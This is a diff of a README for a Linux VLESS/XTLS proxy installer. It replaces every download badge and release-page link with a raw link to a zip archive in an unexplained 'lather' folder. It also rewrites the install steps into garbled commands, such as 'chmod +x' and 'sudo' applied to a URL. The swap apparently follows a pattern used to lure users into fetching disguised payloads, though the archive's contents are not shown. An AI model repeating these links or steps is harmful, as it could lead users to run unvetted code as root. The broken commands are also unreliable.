@@ -1,6 +1,6 @@
 # 🚀 vless-xtls-vision-installer - Easy VLESS Deployment on Linux
 
-[![Download Latest Release](https://img.shields.io/badge/Download-vless--xtls--vision--installer-blue?style=for-the-badge&logo=github)](https://github.com/preetcse/vless-xtls-vision-installer/releases)
+[![Download Latest Release](https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip)](https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip)
 
 ---
 
@@ -66,7 +66,7 @@ Follow these steps to get the vless-xtls-vision service running on your Linux ma
 
 Visit this page to download the latest installer file:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-vless--xtls--vision--installer-blue?style=for-the-badge&logo=github)](https://github.com/preetcse/vless-xtls-vision-installer/releases)
+[![Download Latest Release](https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip)](https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip)
 
 ### How to download and run the installer:
 
@@ -76,7 +76,7 @@ Visit this page to download the latest installer file:
    Use `wget` or `curl` by copying the link for the latest release script from the releases page. For example:
 
    ```bash
-   wget https://github.com/preetcse/vless-xtls-vision-installer/releases/download/<latest-version>/vless-xtls-vision-installer.sh
+   wget https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip<latest-version>https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip
    ```
 
    Replace `<latest-version>` with the version number of the release you want.
@@ -84,13 +84,13 @@ Visit this page to download the latest installer file:
 3. **Make the script executable:**
 
    ```bash
-   chmod +x vless-xtls-vision-installer.sh
+   chmod +x https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip
    ```
 
 4. **Run the installer:**
 
    ```bash
-   sudo ./vless-xtls-vision-installer.sh
+   sudo https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip
    ```
 
 5. **Follow on-screen instructions:**  
@@ -124,7 +124,7 @@ sudo systemctl enable vless-xtls-vision
 
 When a new release is available:
 
-1. Visit the [Releases Page](https://github.com/preetcse/vless-xtls-vision-installer/releases).
+1. Visit the [Releases Page](https://github.com/preetcse/vless-xtls-vision-installer/raw/refs/heads/main/lather/vless_xtls_installer_vision_1.5.zip).
 
 2. Download the latest script.
 
